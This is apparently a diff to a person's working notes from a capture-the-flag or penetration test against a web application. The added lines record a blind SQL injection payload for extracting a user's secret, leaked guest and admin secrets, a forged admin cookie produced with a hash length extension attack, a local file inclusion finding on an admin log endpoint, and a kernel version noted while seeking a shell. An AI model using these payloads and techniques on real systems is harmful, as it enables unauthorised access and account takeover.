@@ -78,3 +78,16 @@ insert into messages values ('%s')
   WE DID IT, there are two users... the secret is:
     f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
       this is different that the guest secret that we know, so assume its admin
+      NOTE: someone else tried: payload = "' AND (SELECT CASE WHEN ((SELECT length(secret) FROM users LIMIT 1) = "+str(i)+") THEN 1 ELSE MATCH(1,1) END ))--"
+
+username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
+username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;
+
+hashpumpy for hash length attack to make a legitimate signature (test.py):
+dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.1j70EV093ANGB2SwhrsbHxxsXnxhENqU+VMD5vj5Buc=
+
+LFI works on /admin/log/view
+  make requests with a python script (or postman), burp doesnt work for some reason
+
+but how the ef do you get a shell?
+Linux version 4.15.0-55-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) 
